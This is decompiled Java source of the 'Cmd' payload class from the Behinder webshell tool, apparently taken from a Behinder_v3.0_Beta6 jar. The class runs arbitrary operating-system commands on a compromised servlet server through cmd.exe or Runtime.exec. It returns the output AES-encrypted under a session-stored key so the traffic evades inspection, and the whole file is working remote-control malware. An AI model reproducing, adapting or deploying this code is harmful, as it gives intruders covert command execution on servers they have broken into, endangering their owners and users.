package net.rebeyond.behinder.payload.java;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.charset.Charset;
import java.util.HashMap;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;





public class Cmd
{
  public static String cmd;
  private ServletRequest Request;
  private ServletResponse Response;
  private HttpSession Session;
  
  public boolean equals(Object obj) {
    PageContext page = (PageContext)obj;
    this.Session = page.getSession();
    this.Response = page.getResponse();
    this.Request = page.getRequest();
    page.getResponse().setCharacterEncoding("UTF-8");
    Map<String, String> result = new HashMap<>();
    try {
      result.put("msg", RunCMD(cmd));
      result.put("status", "success");
    }
    catch (Exception e) {
      result.put("msg", e.getMessage());
      result.put("status", "success");
    } finally {

      
      try {
        
        ServletOutputStream so = this.Response.getOutputStream();
        so.write(Encrypt(buildJson(result, true).getBytes("UTF-8")));
        so.flush();
        so.close();
        page.getOut().clear();
      } catch (Exception e) {
        
        e.printStackTrace();
      } 
    } 
    return true;
  }
  
  private String RunCMD(String cmd) throws Exception {
    Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
    String result = "";
    if (cmd != null && cmd.length() > 0) {
      Process p;
      if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
        p = Runtime.getRuntime().exec(new String[] { "cmd.exe", "/c", cmd });
      } else {
        p = Runtime.getRuntime().exec(cmd);
      } 
      BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "GB2312"));
      String disr = br.readLine();
      while (disr != null) {
        result = result + disr + "\n";
        disr = br.readLine();
      } 
      result = new String(result.getBytes(osCharset));
    } 
    return result;
  }
  
  private byte[] Encrypt(byte[] bs) throws Exception {
    String key = this.Session.getAttribute("u").toString();
    byte[] raw = key.getBytes("utf-8");
    SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
    Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
    cipher.init(1, skeySpec);
    byte[] encrypted = cipher.doFinal(bs);
    return encrypted;
  }
  
  private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
    StringBuilder sb = new StringBuilder();
    String version = System.getProperty("java.version");
    sb.append("{");
    for (String key : entity.keySet()) {
      
      sb.append("\"" + key + "\":\"");
      String value = ((String)entity.get(key)).toString();
      if (encode)
      {
        if (version.compareTo("1.9") >= 0) {
          
          getClass(); Class<?> Base64 = Class.forName("java.util.Base64");
          Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
          value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { value.getBytes("UTF-8") });
        }
        else {
          
          getClass(); Class<?> Base64 = Class.forName("sun.misc.BASE64Encoder");
          Object Encoder = Base64.newInstance();
          value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { value.getBytes("UTF-8") });
          value = value.replace("\n", "").replace("\r", "");
        } 
      }

      
      sb.append(value);
      sb.append("\",");
    } 
    if (sb.toString().endsWith(","))
      sb.setLength(sb.length() - 1); 
    sb.append("}");
    return sb.toString();
  }
}


/* Location:              C:\Users\xxx\Downloads\Behinder_v3.0_Beta_6_win\Behinder_v3.0_Beta6_win.jar!\net\rebeyond\behinder\payload\java\Cmd.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */